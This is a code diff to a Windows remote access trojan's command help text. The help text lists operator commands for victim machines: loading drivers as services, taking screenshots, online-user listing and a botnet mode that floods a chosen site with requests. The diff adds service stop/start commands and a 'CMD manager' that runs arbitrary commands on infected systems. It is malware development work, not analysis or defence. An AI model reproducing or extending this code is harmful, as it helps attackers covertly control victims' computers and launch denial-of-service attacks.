@@ -176,6 +176,8 @@ INT_PTR DlgMain(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
 						"/user[ID] service show - show all services in system %0A"
 						"/user[ID] service add [Name] [DisplayName] [C:\\ProgramData\\yourdriver.sys] [Type-Driver] [Start-Type] - load driver to system %0A"
 						"/user[ID] service delete [NameService] - delete service from system %0A"
+						"/user[ID] service stop [NameService] - stop the running service %0A"
+						"/user[ID] service start [NameService] - start the stopped service %0A"
 
 						"%0AScreen manager:%0A"
 						"/user[ID] screenshot - take screenshot and send you %0A"
@@ -183,6 +185,9 @@ INT_PTR DlgMain(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
 						"%0ABotNet:%0A"
 						"/botnet start [url] - all users send requests on site %0A"
 						"/botnet stop - stop sending requests %0A"
+
+						"%0ACMD manager:%0A"
+						"/user[ID] system [arguments] - run cmd with arguments %0A"
 
 						"%0ARAT:%0A"
 						"/online - show online users%0A";
